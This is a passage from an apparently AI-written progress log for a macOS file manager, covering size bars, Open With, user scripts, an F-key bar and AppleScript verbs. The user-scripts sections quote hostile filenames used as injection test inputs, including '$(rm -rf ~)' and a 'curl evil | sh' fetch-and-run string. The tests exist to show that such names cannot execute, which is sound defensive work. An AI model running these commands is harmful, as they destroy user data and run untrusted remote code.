LIVE**): the toggle (⌃B), the bar column, and the scan that fills it. **The user settled pass 9's
policy question: auto-scan, ncdu's model** — and it was the only live option, because the core's
"unknown is not zero" rule means a lazy mode opens on a column that is empty for every folder in it.
**Per tab** (not an app-wide preference like Show Tags): it is what "toggle *panel* to bars" says, it
is the dual-pane payoff, and above all this is the one mode in the app that *spends* something to be
on. Probing again ran ahead of the Swift (the pass-1 method), and it **overturned two of pass 9's own
conclusions**:
- **Continuous width does NOT rescue the dynamic range — pass 9's central claim about pass 10 was
  wrong.** It reasoned that drawing in AppKit is "~8x finer than eighth-blocks, so pass 10 needs only
  a minimum-ink rule". Measured against real directories at an 80 pt bar: in `~`, **86 of 93 rows
  compute to under half a point** (12 of 15 in this repo; `/Applications`, at 6 of 38, is the only
  humane one). The range in `~` is ~10⁶, and 8x is nothing against it. So the floor is not a rounding
  nicety that buys legibility — **it is the difference between "negligible" and "empty"**, and it
  fires constantly. `SizeBar.inkWidth(in:minimum:)` went to the *core* with tests (bytes → width is
  the core's rule), and **zero bytes draws zero ink** deliberately: an empty folder is not
  negligible, it is empty. The tail stays illegible whatever we do — which is *why* pass 9's `share`
  is drawn as a number beside the bar; ncdu keeps the percentage for exactly this reason. A log/sqrt
  scale is **rejected, not deferred**: it would make the tail visible by making bar length mean
  something other than proportion, and a test pins the compression so nobody "fixes" it later.
- **FINDING: pass 9's "serialized" queue buried the one row the chart is about.** Display order is
  alphabetical and uncorrelated with walk cost, so serialized, `Movies` — **79 % of home** — landed at
  **35.7 s of a 35.7 s scan**, dead last, queued behind `Library` (17.0 s) and `Dev` (10.7 s). Movies
  itself walks in 0.03 s: the wait was head-of-line blocking, not work. Widening the queue —
  1→35.7 s/35.7 s, 4→17.9 s/**3.4 s**, 8→16.3 s/**1.8 s**, 16→15.7 s/**0.3 s** (total/t-to-Movies) —
  is not bought for throughput (total plateaus at ~15.7 s, which is `Library` alone and unsplittable)
  but so the chart is *right* within ~2 s instead of re-scaling 8x at the very end. The fear that
  bounded it was measured too, and was mostly unfounded: `DirectorySizer.size` blocks a cooperative-
  pool thread and Swift's pool does not over-commit, yet an interactive listing's **worst case stayed
  at 2.9 ms at width 8** (baseline max 3.5 ms) against M1's 150 ms budget; only width 16 — this
  machine's entire core count — perturbed it at all (12.9 ms). Width is `cores/2`, clamped [2, 8].
- **`DirectorySizeProvider`** — shaped like `GitStatusProvider`/`FinderTagProvider` (off-main, cached,
  published by notification), shared because the unit of caching is one directory's total. Drains
  **newest-request-first** so navigating never waits behind a folder you left; publishes are
  **coalesced to ~10/s**, which is what keeps a 68-directory scan from becoming 68 re-sorts and makes
  the cost independent of row count. Walks use a new `DirectoryLoader.cancellableSize` — a *child*
  task, not detached, so cancellation reaches `DirectorySizer`'s own `isCancelled` mid-walk (the
  existing detached `size` deliberately keeps outliving its caller for Space-on-dir).
- **Two bugs the live run caught that nothing else would have**, both invisible to tests and lint:
  (1) **the first toggle did nothing at all** — installed its column, then no bars and no scan. The
  projection is built inside the render pass, and `updateSizeVisualization` skipped the render when
  the cache came back empty, which is exactly a first toggle; the pending list is read *from* the
  projection that was therefore never built. (2) Fixing that exposed the next: `requestScan` runs on
  every render, and an in-flight child still has no total, so it is still "pending" — the provider
  would have re-queued the whole in-flight batch ten times a second. The provider now tracks
  `inFlight` and de-duplicates.
- Bar column is **contextual like the Git gutter but on a different condition** (the gutter follows
  the *directory*, this follows the *tab*), sits **immediately after Size** — the adjacency that is
  the whole reason the core measures logical bytes — and is **charged to Name**, never added on top.
  That generalized `currentColumnLayout`'s reclaim from one hardcoded ternary to a sum: left alone it
  would have under-reclaimed by 137 pt whenever both columns were up, ratcheting Name narrower on
  every toggle inside a repository. Verified live: pixel-identical headers across repeated toggles.
+14 tests → **678 core tests** (was 669) and **38 app tests** (was 33); `swift test` green, swiftformat
+ swiftlint-strict clean. The type-body gotcha re-fired twice and was paid down rather than
suppressed: `SizeBarTests` is its own file (`SizeVisualizationTests` was at its 250-line limit), and
`PanelViewController` crossed both file *and* type-body limits, so the FSEvents block moved to
`PanelViewController+Watch` along the seam its own `MARK` already drew. **VERIFIED LIVE** against the
real `~`: bars streamed in progressively, and with hidden rows shown the app rendered **Movies 1,08 TB
at 79.2 % filling the bar** and **Library 10.3 %** — matching the independent probe's 79.1802 % and
10.3339 % exactly, with `.lmstudio` observed *settling* 3.2 % → 2.8 % as `Library` landed (the
documented "share of what is known so far"). Toggling hidden rows re-scaled Movies 94.5 % → 79.2 %
(visible-rows-only denominators, live); **Zero KB folders drew no ink while 6 KB ones drew the floor**;
the `..` row drew nothing; the cursor row's bar used the emphasized fill; and the mode stayed in one
pane while the other browsed normally. Switching the mode off **keeps the computed sizes** — they are
Space-on-dir's too, not this mode's to erase. GOTCHA (cost ~20 minutes, and it is a trap for every
future live pass): **`xcodebuild` writes to `~/Library/Developer/Xcode/DerivedData/`, while the repo's
own `build/` directory is a stale copy** — `open build/.../Dirnex.app` silently ran a build from the
previous day, whose View menu was missing the new command *and* pass 8's terminal drawer. Two stale
instances were also already running. Launch from the DerivedData path, and check `ps` first.
**NEXT (M6 pass 11):** Share sheet / "Open With" / Services, then the automation slice (AppleScript/
Shortcuts verbs + user shell scripts on the selection) that M6's exit criteria actually name, then the
iCloud sync-status column. Deferred and still worth doing: extending `DirectoryWatcher` to deliver
event paths, which would keep size invalidation surgical instead of dropping a whole root-to-leaf line
per ping (the conservative rule is correct, just wasteful); and ncdu's `r` — an explicit
refresh/rescan, for which `DirectorySizeCache.removeAll` already exists unused.

Progress (2026-07-16, M6 pass 11 — Share sheet / Open With / Services; **the box closes `[x]`,
VERIFIED LIVE**): the three ways a file leaves this app for another one. Probing ran ahead of the
Swift again (the pass-1 method) and it decided the whole design — three findings, each of which the
obvious implementation would have got wrong:
- **LaunchServices answers per *type*, not per file, and asking is ~25x the cost of reading a type**
  (`urlsForApplications` 6.8 ms/100 vs `contentType` 0.27 ms/100). Two files of one type return
  **byte-identical** app lists, and the `UTType` overloads return exactly what the per-URL ones do
  (checked both). So the core is keyed on **distinct types**: a selection collapses to its types
  first and a thousand marked photos ask **once**. A test with a counting probe pins it, because it
  is the one thing holding a big selection's right-click under the frame budget.
- **The rule for a multi-file selection is intersection, and it bites immediately**: `a.txt` offers
  14 apps, `c.png` offers 8, and together they offer **3** — TextEdit and Preview both drop out.
  Anything less than intersection would list an app that opens half of what you picked.
- **A default is only offered when every type agrees on one** (unanimity), and it must survive the
  intersection. A mixed selection where the types disagree promotes **nothing**: "the app this opens
  in" over a menu that opens the other half in something else is a lie, and Finder doesn't tell it.
  An untypeable item (unknown extension → genuinely 0 apps; or a file deleted between listing and
  right-click → no type at all) **collapses the answer to empty** rather than being skipped — both
  mean "no app opens *every* item", and LaunchServices reaches the same answer on its own, just
  slower. `OpenWithApplications` + `ApplicationRef`/`OpenWithCandidates` are pure, with the probes
  injected exactly like `ExternalDiffTool`.
- **App layer**: `OpenWithLauncher` (the LaunchServices probes + launch; **one** launch for the whole
  selection, so twelve images are one Preview with twelve tabs, not twelve cold starts) and
  `PanelViewController+OpenWith`. Open With and Share are **registry commands that pop a menu, not
  menu-bar submenus** — ⌃T's shape: a File-menu submenu would have to find the focused pane from a
  static builder, while a command rides the responder chain, lands in ⌘K for free, and is rebindable.
  The right-click nests both as real submenus built from the **same items** (`openWithMenuItems`,
  mirroring `tagMenuItems` — an `NSMenuItem` lives in one menu at a time, so items are the shareable
  unit, not menus). All three gate on `handoffTargets` = the marked set, else the cursor, filtered to
  `.local` — the line `tagTargets` already draws, so it works from a results tab (virtual pane, real
  local hits) and greys inside an archive / on SFTP, which have no URL to hand over.
- **Services** is the smallest piece and the one with a real trap: `NSApp.servicesMenu` is
  **single-valued**, so Services lives in the app menu (where macOS puts it) and is *not* duplicated
  into the right-click — a second copy would take the population away from the first rather than
  getting its own. The integration is `registerServicesMenuSendTypes([.fileURL], returnTypes: [])` +
  the pane's `validRequestor`/`writeSelection`; AppKit then **auto-appends Services to the
  right-click menu by itself**, which the live run showed and no code here asked for.
- Two Swift-6 gotchas, both paid down via existing precedent rather than suppressed:
  `NSServicesMenuRequestor` carries no main-actor annotation → `@preconcurrency` conformance (the
  Quick Look panel's fix); and `NSWorkspace.open`'s callback is `@Sendable` and fires off-main, so
  `completion` couldn't reach it → the **`async` overload** inside a `Task` that inherits the main
  actor (`ExternalDiffLauncher`'s shape). GOTCHA (new): the pane is now the delegate of **two**
  submenus, and `menuNeedsUpdate` is handed the menu, not the item — without identifiers on each
  (`.tagsSubmenu` / `.openWithSubmenu`) opening Open With fills it with the **tag list**. Also
  `displayName`/`localizedName` answer **"TextEdit.app"**, extension and all, whenever Finder's
  hide-extensions is off — the name must come from the bundle's own `CFBundleDisplayName`, and an app
  test pins it.
+16 core tests → **694** (was 678) and +5 app tests → **43** (was 38); `swift test` + app
`xcodebuild test` green, swiftformat/swiftlint-strict clean. **VERIFIED LIVE** (launched from
DerivedData, `ps`-checked for stale instances first — last pass's trap): Open With over `notes.txt`
listed **TextEdit (default)** promoted and separated, then Code/Cursor/Chrome/…/Xcode alphabetically
with icons and **no ".app" suffixes**, then Other…; marking `notes.txt` + `photo.png` (marks
outranking a cursor parked on the unopenable file) re-listed exactly **Google Chrome, LibreOfficeDev,
Safari** — the probe's predicted intersection, to the app — with **nothing promoted**, the unanimity
rule on screen; `weird.zzzqqq` showed **"No Applications" + Other…**; the right-click carried Open
With ▸ / Share… / Services ▸; **Services listed real file services** (Show in Finder, Show Info in
Finder, Parallels' Open/Reveal in Windows), proving the requestor is being asked; **TextEdit actually
opened `notes.txt`** showing its real content; the **Share sheet** came up reading "notes · Text
Document · 18 bytes" with AirDrop/Mail/Messages (nothing was sent); and both commands **greyed out
inside a zip**. **NEXT (M6 pass 12):** the automation slice M6's exit criteria actually name —
AppleScript/Shortcuts verbs (reveal, copy, run-op) + user shell scripts receiving the selection as
argv/env, surfaced in the palette and F-key bar — then the iCloud sync-status column, which closes
M6. Optional polish now cheap: a **Settings picker for the preferred Open With app** (persist the
`ApplicationRef.bundleIdentifier` the core already carries for exactly this), and Finder's
⌥-toggles-to-"Always Open With".

Progress (2026-07-16, M6 interlude — right-click **Copy Path** everywhere paths live; VERIFIED LIVE):
user asked to copy a location as text from the context menu of a table row (incl. `..`), a path-bar
crumb, and the pane's empty space. A *textual* sibling of ⌘C (which writes file URLs) — new
`PathClipboard` (app) formats `[String]` → newline-joined text and writes it (an injectable
`NSPasteboard` so a test asserts without clobbering the real clipboard); 4 app tests pin the shape.
The three surfaces route to **three different path sources**, which is the whole subtlety: an entry
row copies `selectionTargets()` (so a marked set copies all of them, titled "Copy Paths"); the empty
space copies `panel.path`; and `..` copies **`panel.parentPath`, not the pane dir** — the two share
`backgroundMenu(directory:)` but `contextMenu(forRow:)` hands it the parent for `..`. The item
**captures its paths at build time** into `representedObject`, so a background refresh can't leave it
aimed at a stale row (same reason the crumb menu is built per-crumb, carrying `crumb.target.path`).
One trap avoided: decide entry-vs-`..` from `isParentRow(row)`, **not** the post-retarget
`cursorOnParentRow` — right-clicking a *marked* row leaves that flag untouched and would misread the
row as `..`. **VERIFIED LIVE** in the built app driven end to end: `old-code` row →
`/Users/oleg/jMeter/old-code`; `..` → `/Users/oleg` (parent, not the pane dir); empty space →
`/Users/oleg/jMeter`; the "Users" crumb → `/Users`; and a 2-mark selection → "Copy Paths" copying
`…/old-code\n…/results`. 698 core+app tests green, swiftformat + swiftlint clean.

Progress (2026-07-16, M6 pass 12 — the user-scripts automation core): the pure, tested half of the
automation item's exit-criterion feature ("a user-defined 'convert to webp' script on selection runs
from the palette"). Box stays `[ ]` — no store persistence, no process runner, no palette wiring, no
management UI yet; this is the model + invocation-building half, the same core-first opener every
M4/M5/M6 slice used. **Two new `DirnexCore/Services/` files, purely additive** (no existing-API
changes, so the app is untouched and needs no rebuild). Probing ran ahead of the Swift (the pass-1
method): the `sh -c 'body' name arg1 arg2` argv mapping (`$0`=name, `$1`=arg1, `$#`=count, spaces in
a path preserved as one element) and env/`cwd` passthrough were captured live before the model was
shaped, which fixed the whole security stance in place.
- **`UserScript.swift`** — `UserScript` (name-as-identity `command`+`runMode`+`keywords`, `Codable`,
  secret-free) plus its invocation machinery. `UserScriptRunMode` = `.combined` (one run, whole
  selection as `"$@"`) vs `.perFile` (one run per file, `$1` = that file — the webp case). A
  `UserScriptContext` (selection + both panel dirs) turns into `[UserScriptInvocation]` via
  `invocations(in:shell:)`: **`.combined` yields one invocation even for an empty selection** (a
  directory-scoped script still runs, via env), **`.perFile` yields zero** (nothing to act on).
  **THE SECURITY BOUNDARY, and the reason this is a tested core type, not app glue:** the script text
  is user-authored (trusted), but the *selected paths are attacker-controlled data* — unzip a
  download and you can be browsing a file named ``$(rm -rf ~)`` — so every path is handed to the
  shell as a **separate `argv` element** (`["-c", command, name] + files`) and as environment values,
  **never concatenated into the command text**. A hostile filename therefore arrives as one inert
  `"$1"` and cannot break out and execute — the same "a filename is attacker-controlled data" stance
  `ShellCommandLine` takes for the terminal drawer, pinned by a test that feeds
  ``/tmp/$(rm -rf ~); `curl evil | sh` && echo pwned.txt`` through and asserts it lands verbatim as a
  single argument with the body unchanged. Passing `name` as `$0` also makes the shell's own
  diagnostics read `<name>: …`. The `UserScriptEnvironment` contract (named constants, not magic
  strings) exports `DIRNEX_CURRENT_DIR` (= the process `cwd`), `DIRNEX_OTHER_DIR` (omitted when
  single-pane), `DIRNEX_SELECTION_COUNT`, and `DIRNEX_SELECTED_PATHS` (newline-joined — a documented
  convenience, since `"$@"` is the ambiguity-free authority for a filename that itself holds a
  newline). A palette bridge (`commandID` = `userScript.<name>`, its inverse `name(fromCommandID:)`,
  and `paletteCommand`) lets a script rank/render in ⌘K alongside the built-ins, keyed on the
  `userScript.` prefix so the app can route a pick to the runner instead of an AppKit selector.
- **`UserScripts.swift`** — the ordered, name-de-duplicated collection (a near-twin of
  `ServerConnections`: `save` overwrite-in-place-else-append, `remove`/`rename`/`move`, dedup on
  init *and* on `Codable` decode so a hand-edited store is sanitized), plus `paletteCommands` for the
  app to merge into the catalog.
+22 tests → **724 core tests** (two new suites: invocation shape incl. the empty-selection split, the
two security cases, the env contract, the command-id round-trip, and the collection's save/rename/
move/dedup/JSON rules). `swift test` green, swiftformat + swiftlint-strict clean; app target
untouched. **NEXT (M6 pass 13, the app layer that closes the box):** `UserScriptStore` (UserDefaults
JSON + change-notification, like `ServerConnectionStore`), a `UserScriptRunner` (`Process` per
invocation off-main, sequential, collecting exit codes + stderr, surfacing a failure summary and
leaning on the pane's existing FSEvents watch to show new files — the `ExternalDiffLauncher` shape),
palette dispatch (merge `UserScriptStore.load().paletteCommands` into `reload`, and route a
`userScript.*` pick in `runSelected` to `PanelViewController.runUserScript(_:)` via a
`representedObject`-carrying sender), a `PanelViewController+UserScript.swift` that builds the context
from `handoffTargets`/the two panes' dirs and resolves the shell, a right-click **Scripts ▸** submenu
(dynamic, like the tags/servers submenus), and a management surface to *create* scripts (a Settings
tab or an organizer sheet in the `HotlistOrganizerController` idiom) — then VERIFY LIVE that a
user-defined script on a selection runs from the palette. After that: the **F-key bar** surface (a
TC-style function-key button row, which does not exist in the app yet), and the **AppleScript/
Shortcuts verbs** (reveal, copy, run-op — an AppKit scripting `sdef` / App Intents surface, the
separate automation mechanism the item also names), then the iCloud sync-status column, which closes
M6.

Progress (2026-07-16, M6 pass 13 — the user-scripts app layer; the exit-criterion feature ships,
**VERIFIED LIVE**). The automation box stays `[ ]` because the item also names the **F-key bar** and
the **AppleScript/Shortcuts verbs**, both still to come — but its headline promise, PLAN.md §M6's
exit criterion *"a user-defined 'convert to webp' script on selection runs from the palette"*, is now
real and proven end-to-end. Pass 12's tested `DirnexCore` core (`UserScript`/`UserScripts`) was joined
to AppKit through five new app files plus small wirings, in the same core→app rhythm every milestone
used. No core change (pass 12's 724 tests stand; +1 catalog test for the new command → **725 core**).
- **`UserScriptStore.swift`** — the persistence twin of `ServerConnectionStore`: one shared
  `UserScripts` as JSON in `UserDefaults` (`Dirnex.userScripts`), `load`/`save`, a change
  notification. Secret-free by construction (a script holds only its own shell text + metadata).
- **`UserScriptRunner.swift`** — the non-hermetic half, `ExternalDiffLauncher`'s shape: spawns each
  `UserScriptInvocation` off-main via `Process`, **sequentially** (a `perFile` "convert 400 photos"
  must not fork 400 processes at once), captures exit code + stderr, and reports a `RunOutcome`
  (silent on success — new files arrive via the pane's FSEvents watch, like a Service; a summary alert
  only on a non-zero exit / launch failure). **The one real design call:** a GUI process launched by
  LaunchServices inherits launchd's minimal `PATH`, so `cwebp`/`ffmpeg` wouldn't resolve — the runner
  **unions the standard tool dirs (Homebrew Apple-silicon + Intel, `/usr/bin`, …) onto the inherited
  `PATH`** rather than paying for a login-shell handshake per invocation. It merges the invocation's
  `DIRNEX_*` over the inherited env, sets the cwd, and drains stderr before `waitUntilExit` to dodge a
  full-pipe stall.
- **`PanelViewController+UserScript.swift`** — builds `UserScriptContext` from `handoffTargets`
  (local files only, the Open-With/Share line) + the active pane's dir (cwd/`DIRNEX_CURRENT_DIR`) +
  `host.panelCounterpart`'s dir (`DIRNEX_OTHER_DIR` when local); resolves the shell via
  `TerminalShell.login($SHELL)` (the drawer's resolution); `runUserScript(_:)` reads the script name
  from the sender's `representedObject` (one entry point for both the palette and the submenu),
  runs, and reports. A `perFile` script over an empty selection says "select files first" rather than
  launching zero processes. `manageUserScripts(_:)` opens the organizer; `scriptMenuItems()` builds
  the submenu; a `validateAutomationItem` helper folds into the pane's `validateMenuItem` chain (kept
  under the cyclomatic-complexity limit, like its siblings).
- **Palette dispatch** (`CommandPaletteController`): `reload` joins `CommandCatalog.all` with
  `UserScriptStore.load().paletteCommands` (read fresh each open, so a just-created script is
  searchable immediately); `runSelected` recognises a `userScript.*` id (`UserScript.name(fromCommandID:)`)
  and routes it to `runUserScript(_:)` via a synthetic `representedObject`-carrying `NSMenuItem`,
  everything else keeps the static `CommandBinding.selector` path. A new `file.manageScripts` catalog
  command (+ `CommandBinding` + File menu) makes the organizer reachable from the menu bar and palette.
- **Right-click Scripts ▸ submenu** (`+ContextMenu`): a third lazily-filled submenu (`menuNeedsUpdate`
  switched on the identifier, joining tags + Open With), listing each script then **Manage Scripts…**,
  in both the entry menu and the background menu (a `combined` script runs on the directory).
- **`UserScriptsOrganizerController.swift`** — the *create* surface (the `HotlistOrganizer` idiom,
  grown to a master–detail): a list on the left (+/−), a form on the right (Name, a When-run popup
  `combined`/`perFile`, comma-separated palette Keywords, and a monospaced Command text view with
  quote/dash substitution off so a shell body survives verbatim), each edit written straight to the
  store; name is identity, so a name-field commit is a `rename` that reverts on a clash. GOTCHA
  (recurring): the master–detail tipped the class over SwiftLint `type_body_length` 250 → moved the
  Helpers cluster into a same-file `private extension` (which the rule doesn't count, and same-file
  extensions share the type's `private` scope, so nothing had to widen — unlike the *cross-file* split
  in `SyncDirectoriesController+DiffTable`).
- **App tests** (+5 → **52 app tests**): `UserScriptRunnerTests` spawns real `/bin/sh` to lock the
  runner's contract end-to-end — the cwd + merged `DIRNEX_*` env of a `combined` run, the per-file
  fan-out of `perFile`, empty-selection → zero launches, a non-zero exit surfaced with its stderr,
  and — the load-bearing one — **a file literally named ``$(touch pwned.txt)`` passed through and
  asserted to arrive as one inert `"$1"`, creating no `pwned.txt`** (the security boundary, proven at
  the spawn level, not just at invocation-building).
LIVE VERIFICATION (fixture: two real JPEGs + a text file in a seeded left pane, a second dir in the
right pane): the perFile **"To PNG"** script, run from ⌘K on the two marked photos, produced real
400×400 `photo1.png`/`photo2.png` on disk (one `sips` per file) that appeared via FSEvents; the
right-click **Scripts ▸** submenu listed "To PNG" + "Manage Scripts…"; the organizer **created a new
`combined` "Save List"** entirely through its UI (name, mode, keywords, command), which persisted to
`UserDefaults` and re-loaded on reopen; and running "Save List" from ⌘K wrote `_selection.txt`
containing the two marked paths as `"$@"`, `count=2` (`DIRNEX_SELECTION_COUNT`), and the right pane's
dir (`DIRNEX_OTHER_DIR`) — proving the argv + env contract live. (Aside: a *synthetic* ⌘K keystroke
from the automation harness didn't open the palette — the OS swallows it — but the View-menu item,
which shows ⌘K, opens it fine; that is a harness quirk, not an app defect.) `swift test` (725) + app
`xcodebuild test` (52) green, swiftformat + swiftlint-strict clean. **NEXT (M6):** the **F-key bar**
(a TC-style function-key button row — does not exist in the app yet; a natural home for both built-in
F-key ops and a user script's optional F-key binding), then the **AppleScript/Shortcuts verbs**
(reveal/copy/run-op — an `sdef`/App Intents surface), then the iCloud sync-status column, which closes
M6.

Progress (2026-07-16, M6 pass 14 — the F-key bar; **VERIFIED LIVE**): the Total-Commander function-key
button row along the window bottom. The automation box stays `[ ]` because the item's last piece — the
**AppleScript/Shortcuts verbs** — is still to come, but the F-key bar it also names is now real and
proven end-to-end. Core-first as always; one new core file, five app touch-points.
- **`DirnexCore/Services/FunctionBar.swift`** (pure, tested) — a `FunctionBarSlot` (`functionKey` +
  short `label` + `commandID`, `Codable`) and `FunctionBar.defaultSlots`: **F2 Rename · F3 View · F5
  Copy · F6 Move · F7 NewFolder · F8 Delete**. Data, not AppKit, so the layout is unit-tested and a
  later user-configurable bar (and a user script's F-key binding) is a change to *data*. Every slot
  names a real `CommandCatalog` command (a test pins it); `slot(forFunctionKey:)` is the pane key
  handler's lookup. +7 core tests → **740**.
- **THE key-dispatch insight (why the bar can own F3 with zero double-fire):** F2/F5–F8 already carry a
  bare-function-key **menu key-equivalent**, and AppKit fires a menu equivalent *before* the event ever
  reaches `keyDown`. So a `keyDown` F-key handler only ever *receives* the F-keys with **no** menu
  equivalent — F3 (Quick Look, whose own shortcut is ⌘Y) and, later, a user script's F9–F12 — and can
  dispatch them unconditionally without ever colliding with the menu. `FileTableView.keyDown` grew a
  `functionKeyNumber(for:)` decode (scalars in `NSF1FunctionKey…NSF35FunctionKey`) → a new
  `fileTable(_:functionKey:)` delegate call → `PanelViewController` looks up the slot and dispatches.
  **Live-proven:** pressing the physical **F3** opened Quick Look on `alpha.txt`, exactly the
  no-menu-equivalent path.
- **THE app-layer bug the live run caught, and the real design correction:** the first cut gave each
  button `target = nil` + `action = <selector>`, betting a nil-target dispatch would walk the responder
  chain to the active pane like a menu item does. **It silently no-op'd** — clicking a bottom-bar button
  (outside both panes) drops the pane's first-responder status *first*, so by the time the action
  dispatches, no responder in the key window implements `copyToOtherPane:`. A temporary `NSLog` at the
  dispatch site (app launched from Terminal to capture stderr — `open`-launched apps hide it) made it
  unambiguous: with the fix, `handled=true fr=FileTableView`; the menu path had always worked, isolating
  it to button dispatch. The fix: the button reports its slot to the bar's `onRun` callback; the window
  controller **re-focuses the active pane** (`focusedPanel.focusTable()`) **then** dispatches to nil —
  which both puts the pane back in the responder chain *and* matches TC, where a function-button click
  acts on the active pane and leaves focus there. GOTCHA for the live tester: a click that has to pass
  *through* a modal (cancelling a conflict sheet in the same batch) gets swallowed mid-animation — it
  reads as an intermittent button, but a deliberate single click is 100% reliable (proven by the log).
- **`FunctionBarView.swift`** — a `FunctionBarButton` (borderless, self-drawn: dim monospaced key token
  + primary caption, hover/press fills, a leading hairline on all but the first, `refusesFirstResponder`
  so a click never steals pane focus) in a `fillEqually` `NSStackView`, with a top hairline matching the
  column-header/queue-bar borders. Fixed 28 pt; the window controller owns the height constraint.
- **`BrowserWindowController+FunctionBar.swift`** + main-file layout — the bar is pinned at the **very
  bottom, below the queue bar** (so a running op surfaces its progress just above the buttons that
  started it), collapsed to zero height when off (the queue-bar collapse mechanism). App-wide visibility
  via `AppPreferences.showFunctionBar` (**default on** — a signature discoverability win, the "fix TC's
  adoption problem" goal) + `showFunctionBarDidChange`, so every window toggles together; a
  `view.functionBar` catalog command ("Show Function Key Bar", no shortcut) drives it from the View menu
  (checkmark via `validateToggleItem`), the ⌘K palette, and a Settings ▸ Panels toggle.
- +4 app tests (`FunctionBarViewTests`: every slot resolves to a wired selector; one button per slot
  carrying its slot + refusing focus; a click reports its slot to `onRun`) → **56 app**. `swift test`
  (740) + app `xcodebuild test` (56) green, swiftformat + swiftlint-strict clean. **VERIFIED LIVE**
  (fresh DerivedData build, `ps`-checked): the bar rendered the six buttons; the **F5 Copy** button
  copied the active pane's cursor/marked file to the other pane (raised the real per-file conflict sheet
  on a name clash, and cleanly landed `beta.txt` with no clash); the **F7 NewFolder** button opened the
  create sheet and made `made-by-f7`; **View ▸ Show Function Key Bar** toggled the bar away (panes
  reclaimed the strip) and back, its checkmark tracking; and the physical **F3** key opened Quick Look.
  KNOWN macOS caveat (not a bug): on a Mac keyboard F3/F5/… may be media keys unless "Use F1, F2 etc.
  as standard function keys" is set — the *buttons* always work regardless; the same caveat already
  applied to F5–F8. **NEXT (M6, closes the automation box):** the **AppleScript/Shortcuts verbs**
  (reveal/copy/run-op — an `sdef`/App Intents surface), plus optionally a user script's F-key binding
  (a slot pointing at a `userScript.<name>` command id — the bar and key handler already accept any
  command id, so it's a UI field on the organizer + one core field on `UserScript`). Then the iCloud
  sync-status column, which closes M6.

Refinement (2026-07-16, VERIFIED LIVE — three visual asks from the user): (1) **the bar no longer spans
under the sidebar** — it moved out of the window-wide container and into the *panes column*, a new
`makePaneColumnController` that wraps `[paneStackSplitViewController, functionBar]` as the outer split's
**second** item (the sidebar is the first and now stays full height beside it, exactly as the terminal
drawer already did). The queue bar stays full-width in the container below. (2) **Background is the
sidebar's vibrant material, not a flat fill** — the earlier `windowBackgroundColor` came out RGB(30,30,30),
a near-black neutral grey that read as "black"; the app's actual dark-*blue* is the sidebar's vibrancy, so
the bar now hosts an `NSVisualEffectView` with material **`.sidebar`** (probed live: `.windowBackground`
renders a flat grey, `.sidebar` carries the blue tint) behind the buttons, with an `NSBox` top hairline.
(3) **Buttons are rounded chips filling the height** — self-drawn `NSBezierPath(roundedRect:)` per state
(rest 0.07 / hover 0.14 / press 0.22 `labelColor` alpha, radius 6), the hairline separators dropped, a
`fillEqually` stack with 5 pt gaps and a 3 pt vertical inset, bar height 28→**32**. GOTCHA (recurring):
`makePaneColumnController` tipped `BrowserWindowController` over `type_body_length` 250 → moved both
view-builders into a same-file `private extension` (shares the type's `private` scope, doesn't count toward
the limit). Verified live: the bar sits flush right of the full-height sidebar, its blue matches the
sidebar, the F3 button still opened Quick Look (dispatch survives the reparent — `focusedPanel.focusTable()`
+ nil-target dispatch is independent of where the bar lives). One app test dropped (the leading-separator
invariant) → **55 app**; 740 core green, lint + format clean.

Progress (2026-07-17, M6 pass 15 — the AppleScript verbs; **the automation box closes `[x]`, VERIFIED
LIVE**): the last piece the automation item named — an AppleScript scripting surface — landed, so the
whole item (user scripts + palette + F-key bar from passes 12–14, now the verbs) is `[x]`. I chose
**AppleScript/`sdef`** over the App Intents/Shortcuts alternative the item also offers, for one decisive
reason: it is driveable and observable straight from `osascript`, so every verb was verified end-to-end
from the shell (App Intents would need a Shortcut authored in the Shortcuts app first). Core-first as
always: one new tested core file, then the `sdef` + Info.plist + handlers.
- **`DirnexCore/Services/Automation.swift`** (pure, tested) — three pieces the handlers lean on, so the
  Apple-event glue stays dumb. **`AutomationVerb`** (`.reveal`/`.copySelection`/`.runOperation`, each
  with its AppleScript `commandName`) is the one place the verb names live, referenced by the `sdef`,
  the tests, and error strings. **`AutomationReveal.target(forPOSIXPath:)`** turns a script's POSIX path
  into the `(container, item)` a panel navigates to — Finder semantics (a folder is selected *in its
  parent*, not entered), root has no item, a relative/empty path yields `nil`; `VFSPath` normalizes the
  slashes. **`AutomationOperation.resolve`** maps a free-text operation onto the flat command-id space:
  exact id, then menu title (case- and trailing-`…`-insensitive, so `rename` hits `file.rename`), then a
  user script by name or `userScript.<name>` id — **built-ins win over a like-named user script** (a
  test pins it). +13 core → **753**.
- **`Dirnex/Dirnex.sdef`** — a "Dirnex Suite" with `reveal` (text direct-param), `copy selection`, and
  `run operation` (text direct-param), each mapped to an `NSScriptCommand` subclass via `<cocoa class>`.
  Command names avoid AppleScript's `copy` language keyword (hence `copy selection`, not `copy`).
- **Info.plist via a merge, not a rewrite** — the project is `GENERATE_INFOPLIST_FILE = YES`, which has
  no `INFOPLIST_KEY_*` for the two keys AppleScript needs (`NSAppleScriptEnabled`,
  `OSAScriptingDefinition`). THE build call: add a **partial** `Dirnex/Info.plist` holding only those two
  keys and point `INFOPLIST_FILE` at it — modern Xcode **merges** it over the generated plist rather than
  replacing it (verified in the built bundle: both keys present *and* `CFBundleName` etc. still
  generated). The `.sdef` rides into `Contents/Resources/` automatically because `Dirnex/` is a
  file-system-synchronized group — no explicit resource reference needed.
- **`Dirnex/Scripting/ScriptingCommands.swift`** — the three `@objc(Dirnex…ScriptCommand)` subclasses
  (the `@objc` names are exactly the `sdef`'s `<cocoa class>` strings). Each decodes its direct
  parameter, then — since Apple events arrive on the main thread but `performDefaultImplementation` is
  nonisolated — does the UI work inside `MainActor.assumeIsolated`. **GOTCHA: `assumeIsolated`'s result
  must be `Sendable`, and `Any?` is not** — so the isolated closure returns a `Bool`/`Bool?` and the
  `Any?`/scriptError is built outside it. Failures set `scriptErrorNumber`/`scriptErrorString` so a
  script sees a real AppleScript `error` (proven live: an unknown op raised
  `"…" is not a known Dirnex operation. (-1728)`).
- **`Dirnex/Browser/BrowserWindowController+Scripting.swift`** — where a decoded verb meets the active
  pane. `runCommand(id:)` is now the **single dispatch path** shared by `run operation`/`copy selection`
  *and* the F-key bar (`runFunctionBarSlot` delegates to it), and it routes a `userScript.*` id to the
  script runner exactly as the ⌘K palette does — so bar, palette, and AppleScript can't drift.
- **THE two live-caught dispatch bugs (and the real fix):** first cut used `NSApp.sendAction(to: nil)`
  like the F-key bar. From a script it returned `false` and did nothing, because **an Apple event
  arrives while Dirnex is a *background* app — there is no key window, and `sendAction(to: nil)` starts
